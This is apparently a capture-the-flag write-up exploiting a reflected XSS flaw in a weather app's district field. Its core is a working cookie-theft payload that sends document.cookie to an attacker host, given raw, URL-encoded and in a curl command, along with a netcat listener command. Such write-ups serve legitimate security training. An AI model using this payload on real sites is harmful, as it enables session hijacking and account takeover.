# CTF Challenge: Cyberpunk Weather App - XSS

## 1. Vulnerability Identification

The application is vulnerable to Reflected Cross-Site Scripting (XSS) in the `district` parameter of the weather checking form. When a user submits a district name, if the district is not found, the input is reflected unsanitized into the HTML response.

**Proof of Concept (PoC):**

As demonstrated, sending a POST request to `/` with the following body:

```http
POST / HTTP/1.1
Host: cyberskills.ch:5001
Content-Type: application/x-www-form-urlencoded
Content-Length: 38

district=<img src=x onerror=('alert')>
```

Results in the following HTML output, triggering the JavaScript alert:

```html
<p>District <img src=x onerror=('alert')> not found.</p>
```

This confirms that we can inject arbitrary HTML and JavaScript.

## 2. Exploitation: Stealing Cookies

The goal is to leverage this XSS vulnerability to steal the session cookie of a user (e.g., an admin bot visiting the page with our payload).

### Step 1: Set up a Listener

On an attacker-controlled machine (referred to as `ATTACKER_IP`), set up a simple netcat listener to receive the stolen cookies. Replace `ATTACKER_PORT` with a port of your choice (e.g., 8000 or 9001).

```bash
nc -lvnp ATTACKER_PORT
```

For example, if your IP is `10.0.0.5` and you choose port `9001`:

```bash
nc -lvnp 9001
```

### Step 2: Craft the XSS Payload

We will use an XSS payload that sends the victim's `document.cookie` to our listener.

**Payload HTML:**

```html
<img
  src="x"
  onerror="document.location='http://ATTACKER_IP:ATTACKER_PORT/?c='+document.cookie"
/>
```

This payload, when executed in the victim's browser, will make a GET request to `http://ATTACKER_IP:ATTACKER_PORT/` with the cookies appended as a query parameter `c`.

**URL-encoded payload for the `district` parameter:**
To include this in the `district` form field, it needs to be URL-encoded.
Original: `district=<img src=x onerror="document.location='http://ATTACKER_IP:ATTACKER_PORT/?c='+document.cookie">`
URL-encoded:

```
district=%3Cimg%20src%3Dx%20onerror%3D%22document.location%3D%27http%3A%2F%2FATTACKER_IP%3AATTACKER_PORT%2F%3Fc%3D%27%2Bdocument.cookie%22%3E
```

Remember to replace `ATTACKER_IP` and `ATTACKER_PORT` in the payload _before_ URL-encoding if you are encoding it manually, or ensure your tool does it correctly.

### Step 3: Send the Malicious Request

Submit the crafted payload via a POST request. You can use tools like `curl`, Burp Suite, or a browser's developer tools to modify and resend the request.

**Using `curl`:**

Replace `TARGET_URL` (e.g., `https://cyberskills.ch:5001/`), and ensure `ATTACKER_IP` and `ATTACKER_PORT` in the `-d` field are replaced with your listener's details.

```bash
curl -X POST \
  'TARGET_URL' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-raw 'district=%3Cimg%20src%3Dx%20onerror%3D%22document.location%3D%27http%3A%2F%2FATTACKER_IP%3AATTACKER_PORT%2F%3Fc%3D%27%2Bdocument.cookie%22%3E'
```

For example, if the target is `https://cyberskills.ch:5001/`, your IP is `10.0.0.5`, and port is `9001`:

```bash
curl -X POST \
  'https://cyberskills.ch:5001/' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-raw 'district=%3Cimg%20src%3Dx%20onerror%3D%22document.location%3D%27http%3A%2F%2F10.0.0.5%3A9001%2F%3Fc%3D%27%2Bdocument.cookie%22%3E'
```

If the challenge involves an automated bot visiting links or checking submissions, this payload would need to be triggered within the bot's session.

### Step 4: Receive the Cookies

If the XSS payload is successfully executed in a victim's browser (who has a session cookie, like the `session` cookie you observed), their cookie(s) will be sent to your netcat listener.

Example output on the listener:

```
GET /?c=session=d8ed38d4-b1e0-4a4b-bf91-59719b363369.inViSeZpwKowvPIVNAX8CLv0Q74 HTTP/1.1
Host: ATTACKER_IP:ATTACKER_PORT
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
... (other headers)
```

You can then use this `session` cookie (or any other sensitive cookie captured) to impersonate the victim, potentially accessing privileged areas or retrieving a flag.

## 3. Important Considerations

- **Cookie Name**: The primary cookie observed in your request was `session`. The payload `document.cookie` captures all cookies accessible via JavaScript from that domain.
- **Reachability**: Ensure your `ATTACKER_IP` and `ATTACKER_PORT` are reachable by the server or any bot that might be rendering the page with your payload. If the target server is on the public internet and you are behind a NAT/firewall, you might need to use a publicly accessible server or services like ngrok for your listener.
- **Challenge Goal**: The ultimate goal might be to steal a specific flag stored in a cookie, or to use an admin's session to navigate to a part of the application where the flag is displayed.
- **Encoding**: Pay close attention to character encoding. The payload `<img src=x onerror="document.location='http://ATTACKER_IP:ATTACKER_PORT/?c='+document.cookie">` uses both double and single quotes. When embedding this in HTML attributes or URL parameters, ensure they are handled correctly to avoid breaking the script. The provided URL-encoded version should work for `application/x-www-form-urlencoded` POST bodies.
